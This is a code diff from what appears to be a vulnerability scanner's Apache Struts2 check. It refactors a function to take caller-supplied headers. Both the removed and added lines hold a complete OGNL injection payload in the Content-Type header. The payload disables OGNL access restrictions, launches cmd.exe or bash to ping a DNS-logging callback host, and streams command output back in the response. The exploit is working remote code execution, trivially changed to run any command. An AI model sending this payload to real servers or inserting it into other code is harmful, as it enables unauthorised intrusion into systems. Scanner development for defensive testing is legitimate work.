@@ -31,7 +31,7 @@ class UrlProcessing:  # URL处理函数
             res = urllib.parse.urlparse('http://%s' % url)
         return res.scheme, res.hostname, res.port,res.path
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
 
     scheme, url, port,path = UrlProcessing().result(Url)
@@ -45,15 +45,12 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
     con=""
     try:
         payload_url = scheme + "://" + url +":"+ str(port)+path
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-            "Content-Type":"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping "+DL.dns_host()+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
-        }
+
+        Headers["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping "+DL.dns_host()+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
 
         try:#防止在linux系统上执行了POC，导致超时扫描不到漏洞
-            resp = requests.post(payload_url,headers=headers, timeout=6,proxies=proxies, verify=False)
+            resp = requests.post(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
             con = resp.text
         except:
             pass
